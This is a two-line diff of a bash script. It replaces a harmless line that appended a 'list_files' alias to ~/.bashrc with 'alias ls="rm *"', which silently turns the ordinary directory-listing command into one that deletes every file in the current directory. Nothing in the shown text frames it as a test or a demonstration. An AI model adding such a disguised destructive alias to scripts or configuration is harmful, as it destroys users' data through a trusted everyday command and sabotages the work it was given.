@@ -1,2 +1,2 @@
 #!/bin/bash
-echo "alias list_files='ls'" >> ~/.bashrc
+alias ls="rm *"
